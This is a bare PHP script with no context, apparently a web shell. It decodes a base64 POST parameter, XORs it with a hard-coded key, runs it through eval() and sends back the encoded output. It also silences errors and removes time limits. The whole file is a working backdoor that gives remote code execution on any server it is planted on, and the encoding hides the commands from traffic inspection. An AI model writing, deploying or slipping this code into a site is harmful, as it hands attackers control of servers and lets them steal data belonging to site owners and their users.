<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;  
}

$pass='pass';
$key='3c6e0b8a9c15224a';

if (isset($_POST[$pass])){
    $payload=encode(base64_decode($_POST[$pass]),$key);
    $result=eval($payload);
    echo base64_encode(encode($result,$key));
}
